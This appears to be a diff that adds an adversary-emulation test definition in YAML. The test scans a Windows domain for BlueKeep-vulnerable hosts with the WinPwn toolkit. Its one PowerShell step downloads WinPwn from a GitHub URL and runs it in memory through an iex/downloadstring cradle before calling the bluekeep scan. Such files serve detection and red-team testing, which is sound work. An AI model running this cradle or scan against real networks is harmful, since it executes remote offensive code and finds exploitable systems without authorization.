@@ -1,0 +1,22 @@
+api_version: "2.0"
+name: WinPwn - bluekeep
+description: Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).
+uuid: 1cca5640-32a9-46e6-b8e0-fabbe2384a73
+mitre:
+    tactics:
+        - 'TA0007: Discovery'
+    techniques:
+        - 'T1046: Network Service Discovery'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---bluekeep
+      inline: |-
+        $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+        bluekeep -noninteractive -consoleoutput
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
